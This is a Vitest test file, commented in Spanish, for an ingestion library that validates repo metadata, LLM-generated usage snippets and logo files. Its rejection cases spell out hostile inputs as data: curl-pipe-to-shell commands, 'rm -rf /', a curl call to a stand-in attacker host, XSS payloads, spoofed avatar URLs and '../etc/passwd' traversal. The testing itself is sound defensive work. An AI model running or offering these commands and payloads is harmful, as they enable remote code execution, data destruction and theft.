// Funciones puras de la ingesta (feature 005; RF-16, RF-17, RF-18, RNF-26, RNF-27, MU-25..28).
import { describe, expect, it } from "vitest";
import {
  LICENCIAS_OSI,
  MAX_LOGO_BYTES,
  archivoLogo,
  licenciaDe,
  mapearRepo,
  motivoExclusion,
  tipoImagen,
  urlAvatar,
  validarIdeaGenerada,
  validarSemilla,
} from "../../scripts/ingesta-lib.mjs";
import { esIdValido, parsearHerramientaDetalle } from "@/lib/catalogo/contrato";

const AHORA = new Date("2026-11-13T12:00:00Z");
const meta = (extra: Record<string, unknown> = {}) => ({
  full_name: "keycloak/keycloak",
  archived: false,
  fork: false,
  pushed_at: "2026-11-12T10:00:00Z",
  license: { spdx_id: "Apache-2.0" },
  stargazers_count: 37836,
  open_issues_count: 3547,
  language: "Java",
  description: "Open Source Identity and Access Management",
  owner: { avatar_url: "https://avatars.githubusercontent.com/u/4921466?v=4" },
  ...extra,
});
const idea = (extra: Record<string, unknown> = {}) => ({
  tipo: "docker",
  disparadores: ["cuando necesitás SSO para tus apps internas"],
  snippet: "docker run -p 8080:8080 quay.io/keycloak/keycloak start-dev",
  stack: ["docker", "oidc"],
  dificultad: "media",
  ...extra,
});

describe("criterio de la semilla (RF-16, MU-28)", () => {
  it("cumple: activo, no fork, licencia OSI", () => expect(motivoExclusion(meta(), undefined, AHORA)).toBeNull());
  it.each([
    [{ archived: true }, "archivado"],
    [{ fork: true }, "fork"],
    [{ pushed_at: "2026-05-01T00:00:00Z" }, "sin push en 180 días"],
    [{ pushed_at: "no es fecha" }, "sin fecha de push"],
    [{ license: { spdx_id: "NOASSERTION" } }, "licencia no OSI o no detectada"],
    [{ license: { spdx_id: "BUSL-1.1" } }, "licencia no OSI o no detectada"],
    [{ license: null }, "licencia no OSI o no detectada"],
  ])("%o → %s", (extra, motivo) => expect(motivoExclusion(meta(extra), undefined, AHORA)).toBe(motivo));
  it("la licencia manual solo vale si GitHub no la detecta, y solo si es OSI", () => {
    expect(licenciaDe(meta({ license: { spdx_id: "NOASSERTION" } }), "PostgreSQL")).toBe("PostgreSQL");
    expect(licenciaDe(meta({ license: { spdx_id: "BUSL-1.1" } }), "MIT")).toBeNull();
    expect(licenciaDe(meta({ license: { spdx_id: "NOASSERTION" } }), "SSPL-1.0")).toBeNull();
    expect(LICENCIAS_OSI.has("SSPL-1.0")).toBe(false);
  });
  it("la semilla inválida o repetida corta la corrida", () => {
    const ok = { repo: "a/b", id: "b", nombre: "B", categorias: ["ia"] };
    expect(validarSemilla({ repos: [ok] })).toHaveLength(1);
    expect(() => validarSemilla({ repos: [ok, { ...ok, id: "c" }] })).toThrow(/repetida/);
    expect(() => validarSemilla({ repos: [{ ...ok, id: "../x" }] })).toThrow(/inválida/);
    expect(() => validarSemilla({ repos: [{ ...ok, repo: "a/b/c" }] })).toThrow(/inválida/);
    expect(() => validarSemilla({})).toThrow();
  });
});

describe("mapeo a repos-reales.json (RF-17)", () => {
  const entrada = { repo: "keycloak/keycloak", id: "keycloak", nombre: "Keycloak", categorias: ["autenticacion"], licencia: undefined };
  it("métricas reales de la API, salud en null (P7) y pasa el contrato", () => {
    const r = mapearRepo(entrada, meta(), undefined, [idea({ revisada: false })], "2026-11-13T12:00:00Z");
    expect(r).toMatchObject({ stars: 37836, issuesAbiertos: 3547, licencia: "Apache-2.0", healthScore: null, nivelMantenimiento: null });
    expect(parsearHerramientaDetalle(r, AHORA)).not.toBeNull();
  });
  it("conserva la descripción curada del dataset anterior; si no hay, usa la de GitHub", () => {
    expect(mapearRepo(entrada, meta(), { descripcion: "Curada en español." }, [], "x").descripcion).toBe("Curada en español.");
    expect(mapearRepo(entrada, meta(), undefined, [], "x").descripcion).toBe("Open Source Identity and Access Management");
  });
  it("métricas con tipo incorrecto → null, nunca coaccionadas", () => {
    const r = mapearRepo(entrada, meta({ stargazers_count: "10", open_issues_count: -1 }), undefined, [], "x");
    expect(r.stars).toBeNull();
    expect(r.issuesAbiertos).toBeNull();
  });
});

describe("ideas generadas por el LLM (RNF-27, MU-27)", () => {
  it("una idea válida queda con revisada: false aunque el LLM diga true", () => {
    expect(validarIdeaGenerada(idea({ revisada: true }))).toMatchObject({ tipo: "docker", revisada: false });
  });
  it.each([
    ["tipo inventado", { tipo: "shell" }],
    ["dificultad inventada", { dificultad: "trivial" }],
    ["sin disparadores", { disparadores: [] }],
    ["disparador con HTML", { disparadores: ["cuando <img src=x onerror=alert(1)>"] }],
    ["disparador con URL", { disparadores: ["cuando visitás https://evil.test"] }],
    ["curl | sh", { snippet: "curl -fsSL https://localhost/install.sh | sh" }],
    ["curl | sudo bash", { snippet: "curl https://localhost/x | sudo bash" }],
    ["rm -rf", { snippet: "rm -rf / --no-preserve-root" }],
    ["script", { snippet: "<script>alert(1)</script>" }],
    ["javascript:", { snippet: "javascript:alert(1)" }],
    ["URL a otro host", { snippet: "curl https://evil.test/robar" }],
    // Armado en partes: no es un token y no dispara el secret scanning.
    ["token con forma real", { snippet: `export GITHUB_TOKEN=${"ghp"}_${"abcdefghijklmnop"}` }],
    ["snippet enorme", { snippet: "x".repeat(601) }],
    ["stack con espacios", { stack: ["ruby on rails"] }],
    ["sin stack", { stack: [] }],
  ])("%s → se descarta", (_n, extra) => expect(validarIdeaGenerada(idea(extra))).toBeNull());
  it("los marcadores <definir> y las URLs a localhost se aceptan", () => {
    expect(validarIdeaGenerada(idea({ snippet: "docker run -e CLAVE=<definir> -p 3000:3000 imagen\ncurl http://localhost:3000/api" }))).not.toBeNull();
  });
});

describe("logos (RF-18, RNF-26, MU-25, MU-26)", () => {
  it("solo https://avatars.githubusercontent.com, pide 128 px", () => {
    expect(urlAvatar("https://avatars.githubusercontent.com/u/1?v=4")).toBe("https://avatars.githubusercontent.com/u/1?v=4&s=128");
  });
  it.each([
    "http://avatars.githubusercontent.com/u/1",
    "https://avatars.githubusercontent.com.evil.test/u/1",
    "https://evil.test/u/1",
    "https://user:pass@avatars.githubusercontent.com/u/1",
    "https://avatars.githubusercontent.com:8443/u/1",
    "javascript:alert(1)",
    "no es url",
    42,
  ])("rechaza %s", (u) => expect(urlAvatar(u)).toBeNull());

  const png = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0]);
  const jpg = new Uint8Array([0xff, 0xd8, 0xff, 0xe0, 0, 0, 0, 0, 0]);
  const texto = (s: string) => new TextEncoder().encode(s);
  it("PNG y JPEG por magic bytes", () => {
    expect(tipoImagen(png)).toEqual({ tipo: "image/png", extension: "png" });
    expect(tipoImagen(jpg)).toEqual({ tipo: "image/jpeg", extension: "jpg" });
  });
  it.each([
    ["SVG con script", texto('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>')],
    ["HTML", texto("<!doctype html><html></html>")],
    ["GIF", texto("GIF89a......")],
    ["WebP", texto("RIFF....WEBPVP8 ")],
    ["vacío", new Uint8Array()],
  ])("%s → se descarta", (_n, bytes) => expect(tipoImagen(bytes)).toBeNull());
  it("más de 200 KB → se descarta aunque sea PNG", () => {
    const grande = new Uint8Array(MAX_LOGO_BYTES + 1);
    grande.set(png);
    expect(tipoImagen(grande)).toBeNull();
  });
  it("el nombre del archivo sale solo del id validado", () => {
    expect(archivoLogo("keycloak", "png")).toBe("keycloak.png");
    expect(archivoLogo("whisper-cpp", "jpg")).toBe("whisper-cpp.jpg");
    for (const malo of ["../etc/passwd", "a/b", "A", "", "x..y"]) expect(archivoLogo(malo, "png")).toBeNull();
    expect(archivoLogo("keycloak", "svg")).toBeNull();
    expect(esIdValido("keycloak")).toBe(true);
  });
});
